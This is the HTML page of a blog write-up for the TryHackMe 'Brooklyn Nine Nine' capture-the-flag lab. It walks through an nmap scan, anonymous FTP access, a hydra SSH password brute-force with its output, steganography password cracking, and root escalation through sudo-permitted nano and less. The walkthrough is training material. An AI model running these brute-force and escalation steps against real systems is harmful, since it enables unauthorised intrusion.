@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #0f6567;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>THM - Brooklyn Nine Nine</title>
+    <meta name="description" content="Writeup for the B99 Box on THM">
+    <meta name="keywords" content='ctf, cyber security, IT, hackthebox, tryhackme, blog, thm, writeup'>
+
+    <meta property="og:url" content="https://www.miast.io/write-ups/brooklyn-nine-nine/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="THM - Brooklyn Nine Nine">
+    <meta property="og:description" content="Writeup for the B99 Box on THM">
+    <meta property="og:image" content="https://www.miast.io/images/miasto.jpg">
+    <meta property="og:image:secure_url" content="https://www.miast.io/images/miasto.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="THM - Brooklyn Nine Nine">
+    <meta name="twitter:description" content="Writeup for the B99 Box on THM">
+    <meta property="twitter:domain" content="https://www.miast.io/write-ups/brooklyn-nine-nine/">
+    <meta property="twitter:url" content="https://www.miast.io/write-ups/brooklyn-nine-nine/">
+    <meta name="twitter:image" content="https://www.miast.io/images/miasto.jpg">
+
+    
+    <link rel="canonical" href="https://www.miast.io/write-ups/brooklyn-nine-nine/" />
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.edd985581bf860dfb4507e5885197f1680160c7fe19f23b31e183126d99dd596.js" integrity="sha256-7dmFWBv4YN&#43;0UH5YhRl/FoAWDH/hnyOzHhgxJtmd1ZY="></script>
+
+    
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://www.miast.io/">
+                <img src='/images/miasto.jpg' alt="miasto" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://www.miast.io/">Miast.io</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/write-ups/"><span data-feather='book'></span> Write Ups </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/projects/"><span data-feather='code'></span> Projects </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://www.miast.io/about/"><span data-feather='info'></span> About </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/write-ups/"><span data-feather='book'></span> Write Ups </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/projects/"><span data-feather='code'></span> Projects </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://www.miast.io/about/"><span data-feather='info'></span> About </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>THM - Brooklyn Nine Nine</h1>
+        <small role="doc-subtitle">Writeup for the B99 Box on THM</small>
+        <p class="post-date">13 April, 2025
+        
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/thm">thm</a></li>
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/writeup">writeup</a></li>
+        
+            <li class="post-tag"><a href="https://www.miast.io/tags/ctf">ctf</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <h1 id="room-description">Room Description</h1>
+<p><a href="https://tryhackme.com/room/brooklynninenine">Brooklyn Nine Nine</a></p>
+<p>This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.</p>
+<h1 id="writeup">Writeup</h1>
+<h2 id="enumeration">Enumeration</h2>
+<p>As usual I start off with a nmap scan with the default scripts and enumerate version tags enabled to get a good baseline understanding of what ports and services are enabled.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -oN nmapScan 10.10.x.x
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.xx.xx
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.028s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">997</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|   STAT: 
+</span></span><span style="display:flex;"><span>| FTP server status:
+</span></span><span style="display:flex;"><span>|      Connected to ::ffff:10.14.xx.xx
+</span></span><span style="display:flex;"><span>|      Logged in as ftp
+</span></span><span style="display:flex;"><span>|      TYPE: ASCII
+</span></span><span style="display:flex;"><span>|      No session bandwidth limit
+</span></span><span style="display:flex;"><span>|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>|      Control connection is plain text
+</span></span><span style="display:flex;"><span>|      Data connections will be plain text
+</span></span><span style="display:flex;"><span>|      At session startup, client count was <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>|      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span style="display:flex;"><span>|_End of status
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_-rw-r--r--    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">119</span> May <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2020</span> note_to_jake.txt
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#ae81ff">\&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 7.75 seconds
+</span></span></code></pre></div><p>From the the Nmap scan showed that Anonymous FTP access is allowed. So I connected without a password and successfully logged in.</p>
+<blockquote>
+<p><em>note_to_jake.txt</em></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>From Amy,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
+</span></span></code></pre></div><p>Going off of this we can assume that Jakes password is probably guessable from RockYou.txt. Using this I used hydra to bruteforce the password</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.xx.xx
+</span></span><span style="display:flex;"><span>Hydra v9.5 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.xx.xx:22/
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>22<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.xx.xx   login: jake   password: XXXXX
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Writing restore file because <span style="color:#ae81ff">1</span> final worker threads did not complete <span style="color:#66d9ef">until</span> end.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">1</span> target did not resolve or could not be connected
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> <span style="color:#ae81ff">0</span> target did not complete
+</span></span><span style="display:flex;"><span>Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished
+</span></span></code></pre></div><p>However, as the description mentioned there&rsquo;s two ways to get into the box. I decided to look at the webpage.
+There was only one page with a large background image. Clicking on <em>view page source</em>, there is a comment about stego.</p>
+<p><img src="/images/THM-B99-html-comment.png" alt="THM-B99-html-comment.png"></p>
+<p>Going off of this I downloaded the background image. It&rsquo;s a <code>jpg</code> file so we can assume its probably steghide. Attempting to extract it without a password didn&rsquo;t work. So I used <code>stegcracker</code> to bruteforce the password.
+This gave the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Holts Password:
+</span></span><span style="display:flex;"><span>REDACTED@ninenine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enjoy!!
+</span></span></code></pre></div><h2 id="exploitationescalation">Exploitation/Escalation</h2>
+<h3 id="user-flag">User Flag</h3>
+<p>Using the password gained for Holt. I SSH&rsquo;d into the box, and got the user flag</p>
+<p><img src="/images/SSH-Login.png" alt="SSH-Login.png"></p>
+<h3 id="root-flag">Root Flag</h3>
+<h4 id="root-from-holt">Root from Holt</h4>
+<p>Logged in as holt. I first ran <code>sudo -l</code> to see what I can run as the user. This showed we can run Nano as root with no password.</p>
+<p>Going to <a href="https://gtfobins.github.io/">GTFOBins</a> and searching for nano, I found the following.</p>
+<p><img src="/images/GTFOBins.png" alt="GTFOBins.png"></p>
+<p>Following this, I was able to get root. After fixing the shell I read root.txt.
+<img src="/images/THM-b99-root.png" alt="THM-b99-root.png"></p>
+<h4 id="root-from-jake">Root from jake</h4>
+<p>As mentioned, there are two ways to progress in this box. So I SSH&rsquo;d in as Jake to see the other.
+In similar fashion once logged in I ran <code>sudo -l</code> as Jake to see what commands i can run. In this case it was <code>less</code>.</p>
+<p>Checking GTFO bins I found the following:
+<img src="/images/GTOBINS-less.png" alt="GTOBINS-less.png"></p>
+<p>Running this I was  able to gain root again.</p>
+
+        </p>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    <svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="topFunction()" title="Go to top">
+        
+        <path d="M177 159.7l136 136c9.4 9.4 9.4 24.6 0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9 0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9 0L7 329.7c-9.4-9.4-9.4-24.6 0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/>
+    </svg>
+    
+    <script>
+        let backToTopButton = document.getElementById("btt-button");
+
+        window.onscroll = function() {
+            scrollFunction()
+        };
+
+        function scrollFunction() {
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                backToTopButton.style.display = "block";
+            } else {
+                backToTopButton.style.display = "none";
+            }
+        }
+
+        function topFunction() {
+            smoothScrollToTop();
+        }
+
+        function smoothScrollToTop() {
+            const scrollToTop = () => {
+                const c = document.documentElement.scrollTop || document.body.scrollTop;
+                if (c > 0) {
+                    window.requestAnimationFrame(scrollToTop);
+                    window.scrollTo(0, c - c / 8);
+                }
+            };
+            scrollToTop();
+        }
+    </script>
+    
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#room-description">Room Description</a></li>
+    <li><a href="#writeup">Writeup</a>
+      <ul>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#exploitationescalation">Exploitation/Escalation</a>
+          <ul>
+            <li><a href="#user-flag">User Flag</a></li>
+            <li><a href="#root-flag">Root Flag</a>
+              <ul>
+                <li><a href="#root-from-holt">Root from Holt</a></li>
+                <li><a href="#root-from-jake">Root from jake</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+    <span>&copy; 2025 Miast.io</span>
+    
+
+</footer>
+</body>
+</html>
